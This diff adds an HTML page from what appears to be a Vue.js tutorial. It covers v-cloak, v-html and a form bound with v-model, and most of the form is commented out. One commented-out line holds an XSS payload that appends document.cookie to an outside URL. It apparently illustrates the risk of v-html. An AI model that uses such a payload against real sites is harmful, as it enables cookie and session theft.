@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        [v-cloak]{
+            display: none;
+        }
+    </style>
+    <script src="../js/vue.js"></script>
+
+</head>
+
+<body>
+    <div class="root">
+        <h2 v-cloak>{{name}}</h2>
+        <div v-html="str"></div>
+        <!-- <form @submit.prevent="demo">
+            账号：<input type="text" v-model="userInfo.account">
+            <br /><br />
+            密码：<input type="text" v-model="userInfo.password">
+            <br /><br />
+            性别：
+            男<input type="radio" name="sex" value="male" v-model="userInfo.sex">
+            女<input type="radio" name="sex" value="female" v-model="userInfo.sex">
+            <br /><br />
+            爱好：<input type="checkbox" v-model="userInfo.hobby" value="study" vm>学习
+            <input type="checkbox" v-model="userInfo.hobby" value="read" vm>看书
+            <input type="checkbox" v-model="userInfo.hobby" value="draw" vm>画画
+            <br /><br />
+            所属小区：
+            <select name="" id="" v-model="userInfo.city">
+                <option value="">请选择</option>
+                <option value="1">1</option>
+                <option value="2">2</option>
+                <option value="3">3</option>
+            </select>
+            <br /><br />
+            其他信息：
+            <textarea name="" id="" v-model="userInfo.other"></textarea>
+            <br /><br />
+            <input type="checkbox" v-model="userInfo.agree"> 请阅读并接受<a href="">用户协议</a>
+            <br /><br />
+            <button>提交</button>
+        </form> -->
+    </div>
+
+    <!-- <div class="root">
+        <h1>hello {{name}}</h1>
+    </div> -->
+
+    <script>
+        const x = new Vue({
+            el: ".root", // el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串
+            data: { // data用于存储数据，供el指定的容器使用
+                userInfo: {
+                    // str:'<a href='javascript:location.href="http://www.bilibili.com?"+document.cookie'>资源</a>',
+                    account: '',
+                    password: '',
+                    age: 18,
+                    sex: '<h1>hello</h1>',
+                    hobby: {},
+                    city: 'beijing',
+                    other: '',
+                    agree: ''
+                }
+            },
+            methods: {
+                demo() {
+                    console.log(JSON.stringify(this.userInfo));
+                }
+            }
+
+        })
+    </script>
+
+</body>
+
+</html>
